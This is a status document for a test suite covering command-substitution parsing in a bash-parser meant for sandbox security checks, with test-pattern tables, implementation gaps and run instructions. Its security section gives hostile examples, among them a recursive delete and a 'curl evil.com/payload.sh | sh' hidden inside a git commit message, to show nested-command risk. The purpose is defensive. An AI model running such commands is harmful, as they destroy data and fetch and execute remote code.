# Command Substitution Test Suite Status

## Overview

**Created:** 2026-03-03
**Purpose:** Security-first testing for command substitution patterns in bash-parser
**Total Tests:** 30 test cases
**Source:** Combination of real research data (7 examples) + synthetic pedagogical examples (23 examples)

## Files Created

| File | Purpose | Lines | Status |
|------|---------|-------|--------|
| `command-substitution-corpus.el` | Test data corpus with expected results | ~280 | ✅ Complete |
| `test/test-command-substitution.el` | ERT test suite | ~340 | ✅ Complete |
| `COMMAND-SUBSTITUTION-TEST-STATUS.md` | This status document | ~200 | ✅ Complete |

## Test Coverage Matrix

### Tier 1: Basic Patterns (6 tests)
| Test ID | Pattern | Status | Notes |
|---------|---------|--------|-------|
| cmdsub-simple-001 | `$(pwd)` | ⚠️ Pending | Simple substitution |
| cmdsub-simple-002 | `$(date)` | ⚠️ Pending | Date capture |
| cmdsub-simple-003 | `$(whoami)` | ⚠️ Pending | User capture |
| cmdsub-simple-004 | `dir=$(pwd)` | ⚠️ Pending | Variable assignment |
| cmdsub-simple-005 | `$(ls \| wc -l)` | ⚠️ Pending | Pipe inside substitution |
| cmdsub-backtick-001 | `` `pwd` `` | ⚠️ Pending | Legacy backtick syntax |

**Coverage:** Simple $() syntax, backticks, pipes inside substitution

### Tier 2: Parser Challenges (16 tests)

#### Nested Substitution (4 tests)
| Test ID | Pattern | Complexity | Status |
|---------|---------|------------|--------|
| cmdsub-nested-001 | `$(dirname $(which openspec))` | 2-level, REAL | ⚠️ Pending |
| cmdsub-nested-002 | `$(basename $(pwd))` | 2-level | ⚠️ Pending |
| cmdsub-nested-003 | `cat $(find . -name config.yml)` | Find pattern | ⚠️ Pending |
| cmdsub-nested-004 | `$(dirname $(dirname $(pwd)))` | 3-level | ⚠️ Pending |

#### Quoted Context (4 tests)
| Test ID | Pattern | Complexity | Status |
|---------|---------|------------|--------|
| cmdsub-quoted-001 | `"Current time: $(date)"` | Double quotes | ⚠️ Pending |
| cmdsub-quoted-002 | `"=== $(basename "$dir") ==="` | Nested quotes, REAL | ⚠️ Pending |
| cmdsub-quoted-003 | `git commit -m "Update $(date +%Y-%m-%d)"` | Git commit | ⚠️ Pending |
| cmdsub-quoted-004 | `echo 'Literal $(date)'` | Single quotes (no sub) | ⚠️ Pending |

#### Pipes/Redirects (4 tests)
| Test ID | Pattern | Complexity | Status |
|---------|---------|------------|--------|
| cmdsub-pipe-001 | `"$(find "$dir" -name "*.org" \| wc -l) files"` | Find+pipe, REAL | ⚠️ Pending |
| cmdsub-pipe-002 | `count=$(cat file.txt \| wc -l)` | Cat+wc | ⚠️ Pending |
| cmdsub-pipe-003 | `$(ls \| grep test \| head -1)` | 3-stage pipeline | ⚠️ Pending |
| cmdsub-pipe-004 | `files=$(find . -type f \| sort)` | Find+sort | ⚠️ Pending |

#### Multiple Substitutions (4 tests)
| Test ID | Pattern | Complexity | Status |
|---------|---------|------------|--------|
| cmdsub-multiple-001 | `echo $(pwd) $(date)` | 2 independent | ⚠️ Pending |
| cmdsub-multiple-002 | `cp $(which oldcmd) $(which newcmd)` | 2 as args | ⚠️ Pending |
| cmdsub-multiple-003 | `"User: $(whoami) at $(hostname) on $(date)"` | 3 in string | ⚠️ Pending |
| cmdsub-multiple-004 | `diff $(ls *.old) $(ls *.new)` | 2 with globs | ⚠️ Pending |

### Tier 3: Production Patterns & Edge Cases (8 tests)

#### Complex Real-World (4 tests - ALL from research)
| Test ID | Pattern | Complexity | Status |
|---------|---------|------------|--------|
| cmdsub-complex-001 | `for file in $(find . -name "*.el" \| sort)` | For loop, REAL | ⚠️ Pending |
| cmdsub-complex-002 | `for dir in */; do echo "$(basename "$dir")"` | Loop body, REAL | ⚠️ Pending |
| cmdsub-complex-003 | `test -f $(which emacs) && echo "Found"` | Conditional | ⚠️ Pending |
| cmdsub-complex-004 | `result=$(if [ -f test ]; then cat test; fi)` | If inside sub | ⚠️ Pending |

#### Edge Cases (4 tests)
| Test ID | Pattern | Complexity | Status |
|---------|---------|------------|--------|
| cmdsub-edge-001 | `echo $(($(date +%s) + 3600))` | Arithmetic | ⚠️ Pending |
| cmdsub-edge-002 | `cat <<EOF\nLine with $(date)\nEOF` | Heredoc | ⚠️ Pending |
| cmdsub-edge-003 | `` echo `echo \`date\`` `` | Nested backticks | ⚠️ Pending |
| cmdsub-edge-004 | `echo $()` | Empty substitution | ⚠️ Pending |
| cmdsub-edge-005 | `echo \$(not-a-substitution)` | Escaped (literal) | ⚠️ Pending |

## Implementation Status

### Current State: ⚠️ **NOT IMPLEMENTED**

The bash-parser currently extracts command substitution **as text** in positional arguments, but does **NOT**:
- Detect command substitution patterns explicitly
- Extract substitution content separately
- Track nesting levels
- Differentiate between $() and backtick syntax
- Mark operations from nested commands (security risk)

### Required Implementation

**File:** `config/experiments/bash-parser/bash-parser-core.org`

**New functionality needed:**
1. Detect `command_substitution` node type in tree-sitter AST
2. Extract substitution content (the command inside `$()` or backticks)
3. Track nesting level (1 = top-level, 2+ = nested)
4. Add `:command-substitutions` list to parse result
5. Each substitution should be a plist:
   ```elisp
   (:syntax "$()" :content "pwd" :nesting-level 1)
   ```

**Tree-sitter node types to handle:**
- `command_substitution` - for `$(...)`
- `process_substitution` - for `<(...)` and `>(...)`
- Legacy backtick syntax (may be different node type)

### Security Implications

**Why this matters:**
- Command substitution enables **nested command execution**
- Security analysis MUST validate both:
  1. Outer command (e.g., `echo`)
  2. Inner command (e.g., `$(rm -rf /tmp)`)
- Current parser only validates outer command - **CRITICAL SECURITY GAP**

**Examples of risk:**
```bash
# Outer command is safe, inner is dangerous
echo $(rm -rf /important/data)

# Nested injection
curl $(evil-url) | bash

# Hidden in quotes
git commit -m "Update $(curl evil.com/payload.sh | sh)"
```

**Without command substitution extraction:**
- Parser sees `echo` as safe ✅
- Parser misses `rm -rf` inside ❌
- **FALSE SENSE OF SECURITY**

## Running Tests

### Current Status
Tests will **fail** until implementation is complete.

### When to run:
```bash
# After implementing command substitution extraction in bash-parser-core.org
./config/experiments/bash-parser/test/run-command-substitution-tests.sh

# Or via make
make test-command-substitution

# Or directly with Emacs
/Applications/Emacs.app/Contents/MacOS/Emacs -batch \
  --eval "(setq treesit-extra-load-path '(\"/Users/jefffarr/emacs/runtime/tree-sitter\"))" \
  -l config/experiments/bash-parser/bash-parser.el \
  -l config/experiments/bash-parser/command-substitution-corpus.el \
  -l config/experiments/bash-parser/test/test-command-substitution.el \
  -f ert-run-tests-batch-and-exit
```

### Expected progression:
1. **Pre-implementation:** All 30 tests fail (no :command-substitutions in results)
2. **Basic implementation:** Simple tests pass, nested/complex fail
3. **Complete implementation:** All 30 tests pass

## Next Steps

### Immediate (Priority 1: Security Critical)
1. ✅ Create test corpus (COMPLETE)
2. ✅ Write test suite (COMPLETE)
3. ⚠️ Implement command substitution extraction in bash-parser-core.org
4. ⚠️ Run tests and iterate until all pass
5. ⚠️ Update bash-sandbox-security to validate nested commands

### Follow-up (Priority 2-4)
After command substitution is complete, continue with Option A security-first approach:
- **Priority 2:** Escape sequence test suite (244 commands, 2 current tests)
- **Priority 3:** Heredoc test suite (122 commands, 0 current tests)
- **Priority 4:** Loop test suite (192 commands, 1 current test)

## Research Data Attribution

**7 real examples** extracted from:
```
Source: config/experiments/bash-parser/research/bash-commands-from-sessions.jsonl
Date range: Feb 5 - Mar 3, 2026
Total commands with command_substitution: 183 (11.8%)
Average complexity: 8.24/10
```

**Real examples used:**
1. `ls -la $(dirname $(which openspec))` - cmdsub-nested-001
2. Loop with find - cmdsub-complex-001
3. Loop with basename - cmdsub-complex-002
4. Multiple variations of `$(basename "$dir")` pattern

**Synthetic examples:** Created to fill pedagogical gaps and ensure complete coverage of parser edge cases.

## Success Criteria

Test suite is considered **COMPLETE** when:
- ✅ All 30 tests pass
- ✅ Coverage includes: simple, nested, quoted, piped, backtick, multiple, complex, edge cases
- ✅ Real research examples validate production usage
- ✅ Security validation includes nested command checking
- ✅ Parser handles all tree-sitter command substitution node types

## References

- **Specs:** `openspec/specs/bash-parser.md`
- **Implementation:** `config/experiments/bash-parser/bash-parser-core.org`
- **Test framework:** ERT (Emacs Lisp Regression Testing)
- **Research corpus:** `config/experiments/bash-parser/research/bash-commands-from-sessions.jsonl`
- **Gap analysis:** From exploratory agent analysis (2026-03-03)

---

**Status:** ✅ Test suite complete, ⚠️ Awaiting implementation
**Last updated:** 2026-03-03
**Author:** Claude Sonnet 4.5 with Jeff Farr
